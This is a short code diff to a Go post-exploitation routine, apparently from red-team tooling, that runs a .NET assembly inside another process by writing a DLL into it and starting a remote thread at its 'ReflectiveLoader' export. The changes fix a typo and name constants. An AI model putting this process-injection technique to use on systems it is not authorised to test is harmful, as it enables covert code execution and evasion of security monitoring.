@@ -21,6 +21,8 @@ const (
 	PROCESS_ALL_ACCESS  = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
 	MEM_COMMIT          = 0x001000
 	MEM_RESERVE         = 0x002000
+	STILL_RUNNING		= 259
+	EXPORTED_FUNCTION_NAME = "ReflectiveLoader"
 )
 
 var (
@@ -165,9 +167,9 @@ func ExecuteAssembly(hostingDll []byte, assembly []byte, params string, amsi boo
 	// CreateRemoteThread(DLL addr + offset, assembly addr)
 	attr := new(syscall.SecurityAttributes)
 
-	functionOffsset, err := findRawFileOffset(hostingDll, "")
+	functionOffset, err := findRawFileOffset(hostingDll, EXPORTED_FUNCTION_NAME)
 
-	threadHandle, _, err := createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr + uintptr(functionOffsset)), uintptr(assemblyAddr), 0)
+	threadHandle, _, err := createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr + uintptr(functionOffset)), uintptr(assemblyAddr), 0)
 	if err != nil {
 		return err
 	}
@@ -177,7 +179,7 @@ func ExecuteAssembly(hostingDll []byte, assembly []byte, params string, amsi boo
 		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
 			log.Fatalln(err.Error())
 		}
-		if code == 259 {
+		if code == STILL_RUNNING {
 			time.Sleep(1000 * time.Millisecond)
 		} else {
 			break
